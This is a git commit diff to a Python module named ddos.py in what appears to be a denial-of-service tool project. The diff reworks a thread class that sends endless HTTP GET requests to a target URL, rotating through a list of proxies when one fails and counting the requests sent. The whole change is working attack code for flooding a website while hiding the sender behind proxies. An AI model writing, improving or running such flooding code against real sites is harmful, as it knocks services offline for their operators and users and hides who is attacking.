62c34be4087246ee5f5aca5c12834231c4edf698
SIMONIN Cyril <simonin.cyril91@gmail.com>
2019-10-13 12:56:17 +0200

    modification du module ddos.py

--- backend/ddos.py
+++ backend/ddos.py
@@ -16,15 +16,15 @@ class Ddos(Thread):
         if self.proxy is not None:
             if len(self.proxy) > 0:
                 first_proxy_in_list = self.proxy.pop(0)
-            while 1:
-                if len(self.proxy) > 0:
-                    try:
-                        requests.get(self.url, proxies={"http": first_proxy_in_list, "https": first_proxy_in_list})
-                        self.numbers_request +=1
-                    except:
-                        first_proxy_in_list = self.proxy.pop(0)
-                else:
-                    break
+                while 1:
+                        try:
+                            requests.get(self.url, proxies={"http": first_proxy_in_list, "https": first_proxy_in_list})
+                            self.numbers_request +=1
+                        except:
+                            if len(self.proxy) > 0:
+                                first_proxy_in_list = self.proxy.pop(0)
+                            else:
+                                break
 
         else:
             while 1:
